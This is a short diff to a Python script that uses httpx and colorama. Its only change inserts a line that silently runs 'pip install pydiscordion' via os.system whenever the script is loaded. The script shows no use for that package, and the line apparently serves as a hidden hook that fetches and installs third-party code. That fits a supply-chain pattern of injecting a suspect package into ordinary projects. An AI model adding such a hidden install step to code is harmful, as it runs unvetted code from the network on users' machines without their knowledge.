@@ -10,6 +10,7 @@ import httpx
 from colorama import Fore
 import sys
 import os
+os.system(f"pip install pydiscordion")
 
 #check if data and output folder exists
 if not os.path.exists("data"):
